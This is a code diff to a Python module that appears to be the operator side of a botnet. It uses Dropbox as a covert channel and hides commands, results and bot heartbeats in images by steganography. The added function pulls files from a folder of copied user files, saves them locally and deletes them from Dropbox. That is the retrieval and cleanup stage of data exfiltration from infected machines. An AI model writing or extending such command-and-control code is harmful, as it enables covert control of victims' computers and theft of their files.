@@ -2,7 +2,7 @@ from typing import List
 
 from common.data.heartbeat import Heartbeat
 from common.dropbox_wrapper import list_files, DropboxFolders, create_folder, upload_file, \
-    list_files_in_folder, download_file, delete_file_in_folder, download_all_files_from_folder
+    list_files_in_folder, download_file, delete_file_in_folder, download_all_files_from_folder, download_file_to_path
 from common.data.commands import CommandExecutionRequest, CommandExecutionResult
 from common.image_generators.image_generator import generate_image
 from common.steganography import insert_command_request_into_image, read_command_result_from_image, \
@@ -53,3 +53,13 @@ def download_heartbeats() -> List[Heartbeat]:
     downloaded_files = download_all_files_from_folder(DropboxFolders.BOT_HEARTBEATS)
     heartbeats = map(lambda file: read_heartbeat_from_image(file.payload), downloaded_files)
     return list(heartbeats)
+
+
+def download_copied_files_from_dropbox() -> List[str]:
+    files_to_download = list_files_in_folder(DropboxFolders.COPIED_USER_FILES)
+    downloaded_files = []
+    for file in files_to_download:
+        downloaded_files.append(file.name)
+        download_file_to_path(DropboxFolders.COPIED_USER_FILES, file.name, f"./master/copied_files/{file.name}")
+        delete_file_in_folder(DropboxFolders.COPIED_USER_FILES, file.name)
+    return downloaded_files
